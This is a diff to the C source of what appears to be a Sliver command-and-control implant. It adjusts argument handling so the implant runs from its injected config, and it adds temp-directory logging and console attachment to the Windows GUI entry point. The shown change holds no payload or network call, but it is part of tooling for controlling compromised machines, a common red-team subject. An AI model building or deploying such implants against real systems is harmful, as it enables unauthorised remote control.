@@ -527,7 +527,7 @@ int sliver_cli_main(int argc, char **argv) {
     sliver_plat_cleanup();
     return rc;
   }
-  if (argc == 1 || (argc > 1 && argv[1][0] != '-')) {
+  if (argc <= 1 || (argc > 1 && argv[1][0] != '-')) {
     /* Self-contained implant: no arguments, everything from the injected
      * config (this is what generate-cpp produces). */
     int rc = run_from_build_config(argc > 0 ? argv[0] : NULL);
@@ -559,6 +559,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   (void)hPrevInstance;
   (void)lpCmdLine;
   (void)nCmdShow;
-  return sliver_cli_main(0, 0);
+  {
+    /* GUI subsystem has no console: keep a log file so failures are visible,
+     * and hand a real argv[0] to the CLI entry point (argc must not be 0). */
+    char temp[MAX_PATH];
+    char log_path[MAX_PATH];
+    char *argv0 = "implant";
+    char *argv[1];
+    DWORD n = GetTempPathA(MAX_PATH, temp);
+    (void)AttachConsole(ATTACH_PARENT_PROCESS); /* dev: logs appear when run from a shell */
+    if (n > 0 && n < MAX_PATH) {
+      (void)snprintf(log_path, sizeof(log_path), "%ssliver-implant.log", temp);
+      (void)sliver_log_set_file(log_path);
+    }
+    LOG_INFO("implant starting (gui subsystem, pid %u)", (unsigned)GetCurrentProcessId());
+    argv[0] = argv0;
+    return sliver_cli_main(1, argv);
+  }
 }
 #endif
